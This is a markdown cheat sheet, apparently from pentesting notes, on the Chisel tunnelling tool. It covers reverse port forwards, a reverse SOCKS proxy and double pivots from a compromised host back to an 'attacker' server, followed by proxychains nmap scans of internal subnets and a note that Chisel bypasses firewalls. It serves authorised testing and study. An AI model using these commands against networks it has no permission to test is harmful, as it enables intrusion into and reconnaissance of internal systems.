# Chisel

Fast TCP/UDP tunnel over HTTP, great for pivoting.

## Download

```bash
# Download from releases
# https://github.com/jpillora/chisel/releases

# Linux
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_*.gz
chmod +x chisel

# Windows
# Download chisel_windows_amd64.exe
```

---

## Basic Usage

### Server (Attacker)
```bash
# Start server
./chisel server -p 8080 --reverse
```

### Client (Target/Pivot)
```bash
# Connect to server
./chisel client <server_ip>:8080 <tunnel_spec>
```

---

## Tunnel Types

### Reverse Port Forward (Target → Attacker)
Access target's internal services through your attacker machine.

```bash
# Server (attacker)
./chisel server -p 8080 --reverse

# Client (target) - forward internal:80 to attacker:8888
./chisel client <attacker>:8080 R:8888:127.0.0.1:80

# Now access http://localhost:8888 on attacker
```

### Forward Port (Attacker → Target)
Access attacker's services from the target network.

```bash
# Server (attacker)
./chisel server -p 8080

# Client (target) - forward local:3333 to attacker's 4444
./chisel client <attacker>:8080 3333:127.0.0.1:4444
```

### Reverse SOCKS Proxy
Create a SOCKS proxy on attacker to route traffic through target.

```bash
# Server (attacker)
./chisel server -p 8080 --reverse

# Client (target)
./chisel client <attacker>:8080 R:socks

# Use proxy (default port 1080)
proxychains nmap -sT 192.168.1.0/24
```

---

## Common Scenarios

### Scenario 1: Access Internal Web Server
```bash
# Attacker (10.10.14.1)
./chisel server -p 8080 --reverse

# Target (can reach 192.168.1.100:80)
./chisel client 10.10.14.1:8080 R:8888:192.168.1.100:80

# Access on attacker
curl http://localhost:8888
```

### Scenario 2: Pivot to Internal Network
```bash
# Attacker
./chisel server -p 8080 --reverse

# Target (pivot host)
./chisel client 10.10.14.1:8080 R:socks

# Scan internal network through SOCKS
# Edit /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.1.0/24
```

### Scenario 3: Double Pivot
```bash
# Attacker → Pivot1 → Pivot2 → Target

# Pivot1 connects to Attacker
./chisel client <attacker>:8080 R:9001:127.0.0.1:9001

# Pivot2 connects to Pivot1 (through tunnel)
./chisel client <pivot1>:9001 R:socks
```

---

## Tunnel Specification Format

```
[local_host:]local_port:remote_host:remote_port

# Reverse tunnel
R:local_port:remote_host:remote_port

# SOCKS proxy
R:socks
socks

# Specify port for SOCKS
R:8888:socks
```

---

## Options

| Option | Description |
|:-------|:------------|
| `--reverse` | Allow reverse tunnels (server) |
| `-p <port>` | Server port |
| `--socks5` | Enable SOCKS5 |
| `--auth user:pass` | Authentication |
| `-v` | Verbose |

---

## With Proxychains

Edit `/etc/proxychains.conf`:
```
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
# Use proxychains
proxychains curl http://internal-server
proxychains nmap -sT -Pn 192.168.1.100
proxychains ssh user@internal-host
```

---

## Comparison with SSH

| Feature | Chisel | SSH Tunnel |
|:--------|:-------|:-----------|
| Requires SSH | No | Yes |
| Single binary | Yes | No |
| HTTP/HTTPS tunnel | Yes | No |
| Reverse SOCKS | Native | Requires -R |
| Firewall bypass | Better | Limited |
